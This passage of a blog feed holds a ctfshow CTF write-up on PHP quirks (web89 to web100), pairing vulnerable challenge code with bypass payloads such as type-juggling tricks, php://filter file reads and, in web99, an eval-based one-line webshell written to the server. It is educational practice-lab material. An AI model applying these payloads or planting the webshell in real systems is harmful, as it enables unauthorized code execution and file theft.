    <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: ctfshow反序列化</span><br><span class="line">categories: web</span><br><span class="line">mathjax: true</span><br><span class="line">hidden: false</span><br><span class="line"><span class="keyword">tags:</span> </span><br><span class="line">- web</span><br><span class="line">- 反序列化</span><br><span class="line">- ctfshow</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight subunit&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow——sql注入</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow_sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow_sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-05-03T09:23:29.845Z</published>
    <updated>2022-04-28T06:54:06.000Z</updated>
    
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="sql注入" scheme="http://zzuzyj.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow_php特性</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/</id>
    <published>2022-05-03T09:23:29.840Z</published>
    <updated>2022-04-28T08:39:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="web89">web89</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接数组绕过了preg_match函数</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">num</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651129735519.png" alt="1651129735519"></p><h1><span id="web90">web90</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求num等于数字4476不能等于字符4476，可以进制转换绕过</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651129981467.png" alt="1651129981467"></p><p>构造</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">num</span>=0x117c</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651130044391.png" alt="1651130044391"></p><h1><span id="web91">web91</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求传入cmd参数满足if条件输出flag，比较发现两个正则有个m得差异</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651130337001.png" alt="1651130337001"></p><p>可以构造</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=%0aphp</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651130460770.png" alt="1651130460770"></p><h1><span id="web92">web92</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>弱类型比较，直接传入16进制数就好了</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651130608652.png" alt="1651130608652"></p><h1><span id="web93">web93</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ban掉了字母，相当于ban掉了16进制，但是还可以用八进制</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">num</span>=010574</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651131123600.png" alt="1651131123600"></p><h1><span id="web94">web94</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>要求出现字符0且不在首位，但是全等类型ban掉了八进制，但是我们可以在八进制前加一个空格</p><p>由于invtal只识别整数部分，我们可以尝试</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">num</span>= <span class="number">010574</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651132105068.png" alt></p><p>另外还可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.0</span></span><br><span class="line">?num=+<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h1><span id="web95">web95</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>叫上题变化了一些，4476.0</p><p>不再可用，因为绕不过 if($num==4476){</p><p>但是空格+010574仍然可以绕过这句话</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">num</span>= <span class="number">010574</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651132425776.png" alt="1651132425776"></p><h1><span id="web96">web96</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要读取flag，单独使用flag.php</p><p>这时候我们可以加上路径进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?u=/var/www/html/flag.php              绝对路径</span><br><span class="line">?u=./flag.php                          相对路径</span><br><span class="line">?u=php://filter/resource=flag.php      php伪协议             </span><br></pre></td></tr></table></figure><p>都可以读取到flag</p><h1><span id="web97">web97</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> <code>md5()</code>函数无法处理数组，如果传入的值为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的 </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[]</span>=<span class="number">1</span>&amp;<span class="selector-tag">b</span><span class="selector-attr">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651133031493.png" alt="1651133031493"></p><h1><span id="web98">web98</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>$_GET?$_GET=&amp;$_POST:&#39;flag&#39;</code>将POST值覆盖GET值</p><p>直接GET型提交flag会被flag的<code>COOKIE</code>、<code>SERVER</code>覆盖</p><p>但最后需要GET型提交<code>HTTP_FLAG=flag</code></p><p>所以我们构造：<br> <code>GET：?hello</code>POST：HTTP_FLAG=flag`</p><p>其实就是几个三目运算吧</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651133524483.png" alt="1651133524483"></p><h1><span id="web99">web99</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>array_push()</code>将随机数(必定有1)添加到数组<code>$allow</code>中</p><p><code>in_array()</code>函数搜索数组中是否存在指定的值</p><p>利用<code>in_array()</code>的弱比较类型，构造<code>?n=1.php</code></p><p>同时POST传入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651134863089.png" alt="1651134863089"></p><h1><span id="web100">web100</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_numeric 检测是否为数字，因为用and连接，所以只需要有一个为数字就可，同时v2,v3过滤了分号</p><p>构造</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">v1</span><span class="number">=1</span>&amp;<span class="built_in">v2</span><span class="symbol">=var_dump</span>($ctfshow)&amp;<span class="built_in">v3</span>=<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow_php%E7%89%B9%E6%80%A7/1651135186892.png" alt="1651135186892"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;web89&quot;&gt;web89&lt;/span&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="php特性" scheme="http://zzuzyj.github.io/tags/php%E7%89%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow——java</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow_java/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow_java/</id>
    <published>2022-05-03T09:23:29.819Z</published>
    <updated>2022-04-28T06:55:44.000Z</updated>
    
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="java安全" scheme="http://zzuzyj.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>CF1669(Div.4)</title>
